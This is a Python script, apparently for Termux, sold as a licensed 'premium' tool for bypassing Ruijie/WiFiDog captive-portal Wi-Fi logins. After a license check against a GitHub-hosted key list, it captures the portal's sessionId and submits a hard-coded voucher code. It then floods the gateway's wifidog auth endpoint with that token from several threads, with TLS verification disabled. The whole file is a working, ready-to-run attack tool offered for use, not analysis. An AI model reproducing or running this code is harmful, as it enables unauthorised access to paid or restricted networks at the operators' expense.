import requests, re, urllib3, time, threading, os, random, subprocess, sys
from urllib.parse import urlparse, parse_qs, urljoin

# SSL Bypass
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- [GitHub Raw Link] ---
RAW_KEY_URL = "https://raw.githubusercontent.com/kokoarkar446-cloud/bypass-ruijie/refs/heads/main/Key.txt"
LICENSE_FILE = "license.txt"

# --- COLOR DEFINITIONS (Guaranteed for Termux) ---
Y = "\033[93m"  # YELLOW
G = "\033[92m"  # GREEN
R = "\033[91m"  # RED
C = "\033[96m"  # CYAN
W = "\033[97m"  # WHITE
RESET = "\033[0m"

def banner():
    os.system('clear')
    # ၁။ အဝါရောင် အပေါ်စည်း
    print(Y + " ="*35 + RESET)
    
    # ၂။ Ruijie Logo - အလံအရောင်အတိုင်း တစ်ကြောင်းချင်းစီ အရောင်ထည့်ခြင်း
    print(Y + "      ██████╗ ██╗   ██╗██╗     ██╗██╗███████╗" + RESET)
    print(Y + "      ██╔══██╗██║   ██║██║     ██║██║██╔════╝" + RESET)
    print(G + "      ██████╔╝██║   ██║██║     ██║██║█████╗  " + RESET)
    print(G + "      ██╔══██╗██║   ██║██║██   ██║██║██╔══╝  " + RESET)
    print(R + "      ██║  ██║╚██████╔╝██║╚█████╔╝██║███████╗" + RESET)
    print(R + "      ╚═╝  ╚═╝ ╚═════╝ ╚═╝ ╚════╝ ╚═╝╚══════╝" + RESET)
    
    # ၃။ အနီရောင် Premium Edition စာသား
    print(f"        {R}✨ Ruijie Bypass - PREMIUM EDITION ✨{RESET}")
    print(Y + " ="*35 + RESET + "\n")

def get_hwid():
    try:
        # device identification
        return f"ID-{subprocess.check_output(['whoami']).decode().strip()}"
    except:
        return "ID-Unknown"

def verify():
    hwid = get_hwid()
    banner()
    
    # Auto Login Success
    if os.path.exists(LICENSE_FILE):
        print(f"{G}[✓] Status: Active (Auto Login Success){RESET}")
        return True

    try:
        print(f"{W}[*] Connecting to License Server...{RESET}")
        resp = requests.get(RAW_KEY_URL, timeout=10).text
        print(f"{W}[+] YOUR DEVICE ID: {Y}{hwid}{RESET}")
        key = input(f"{Y}[?] ENTER LICENSE KEY: {RESET}").strip()
        
        if f"{key}:{hwid}" in resp:
            with open(LICENSE_FILE, "w") as f:
                f.write(key)
            print(f"{G}[✓] Access Granted! License Saved.{RESET}")
            time.sleep(1)
            return True
        else:
            print(f"{R}[!] Invalid Key or Unauthorized ID.{RESET}")
            sys.exit()
    except:
        print(f"{R}[!] Server Error: Check Your Internet.{RESET}")
        sys.exit()

def check_net():
    try:
        return requests.get("http://www.google.com/generate_204", timeout=5).status_code == 204
    except:
        return False

def high_speed_pulse(link):
    session = requests.Session()
    while True:
        try:
            session.get(link, timeout=10, verify=False)
            # Bypass Status - အစိမ်းရောင်
            print(f"{G}[✓] Bypass Active | Pulse: [{random.randint(100,450)}ms]{RESET}      ", end="\r")
        except:
            break
        time.sleep(random.uniform(1.0, 2.5))

def start_bypass():
    print(f"{C}[*] Attempting to Capture Portal...{RESET}")
    session = requests.Session()
    while True:
        try:
            if check_net():
                print(f"{Y}[•] Internet Connected. Monitoring...{RESET}         ", end="\r")
                time.sleep(10)
                continue

            r = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
            r1 = session.get(r.url, verify=False, timeout=5)
            
            match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
            n_url = urljoin(r.url, match.group(1)) if match else r.url
            r2 = session.get(n_url, verify=False, timeout=5)
            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
            
            if sid:
                print(f"{G}[✓] SID Captured: {sid[:15]}...{RESET}")
                p_host = f"{urlparse(r.url).scheme}://{urlparse(r.url).netloc}"
                
                session.post(f"{p_host}/api/auth/voucher/", 
                             json={'accessCode': '123456', 'sessionId': sid, 'apiVersion': 1}, 
                             timeout=10)
                
                gw = parse_qs(urlparse(r.url).query).get('gw_address', ['192.168.60.1'])[0]
                port = parse_qs(urlparse(r.url).query).get('gw_port', ['2060'])[0]
                auth_link = f"http://{gw}:{port}/wifidog/auth?token={sid}"
                
                # Thread Start - အနီရောင်
                print(f"{R}[*] ⚡ Launching Stability Pulse Threads... ⚡{RESET}")
                for _ in range(5):
                    threading.Thread(target=high_speed_pulse, args=(auth_link,), daemon=True).start()
                
                while check_net():
                    time.sleep(5)
            else:
                # SID Not Found Error
                print(f"{R}[!] SID Not Found. Retrying in 5s...{RESET}", end="\r")
                time.sleep(5)
        except:
            time.sleep(3)

if __name__ == "__main__":
    if verify():
        try:
            start_bypass()
        except KeyboardInterrupt:
            print(f"\n{R}[!] Stopped by User.{RESET}")
